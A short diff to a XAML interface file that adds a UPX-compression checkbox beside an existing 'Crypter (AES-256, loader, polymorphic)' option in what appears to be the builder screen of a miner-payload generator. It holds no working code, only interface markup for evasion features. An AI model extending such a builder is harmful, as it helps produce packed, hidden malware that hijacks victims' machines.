@@ -1284,6 +1284,9 @@
                                         </StackPanel>
                                         <CheckBox x:Name="BldMnrEncrypt" Content="Crypter (AES-256, loader, polymorphic)"
                                                   Style="{StaticResource SChk}" IsChecked="False"/>
+                                        <CheckBox x:Name="BldMnrUpx" Content="UPX compression (upx.exe in PATH or tools/)"
+                                                  Style="{StaticResource SChk}" IsChecked="False"
+                                                  ToolTip="Runs upx --best --lzma on the final output. Reduces size ~70%."/>
                                     </StackPanel>
                                 </Border>
 
